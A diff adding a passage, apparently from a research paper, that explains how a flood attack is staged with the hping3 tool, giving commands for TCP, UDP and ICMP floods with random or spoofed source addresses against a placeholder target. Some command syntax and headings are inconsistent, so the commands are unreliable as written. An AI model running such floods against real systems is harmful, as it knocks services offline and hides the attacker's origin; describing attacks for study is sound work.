@@ -1,1 +1,27 @@
+In the most superficial sense, the attack can be compre- hended as just another system in the network of systems. This system connects to the network subnet and floods the target device with desired packets. 
+Flooding is achieved by installing hping tool and executing hping commands. The target is flushed with TCP, UDP and ICMP packets. Here is a detailed explanation of how the attack is performed using hping.
+
+1. TCP Flood Attack
+
+    To perform a TCP flood attack, the attacker can use a command like:
+
+    hping3 --rand-source --flood --S <target\_port> <target\_ip>
+
+2. UDP Flood Attack:
+
+      hping3 --rand-source --flood --udp -c <packets> <target\_port> <target\_ip>
+
+3. ICMP Flood Attack:
+
+    To perform an ICMP (ping)flood attack, we can use:
+
+     hping3 --rand-source --flood --icmp <target\_port> <target\_ip>
+
+4. UDP Flood Attack with Spoofed IP Address
+
+      We can also execute the attack by spoof- ing the source IP address with a desired IP. This is achieved using the folowing command:
+
+      hping3 --spoof <spoofedip> --flood --S <target\_port> <target\_ip>
+
+      The –spoof allows us to mask the source IP
 
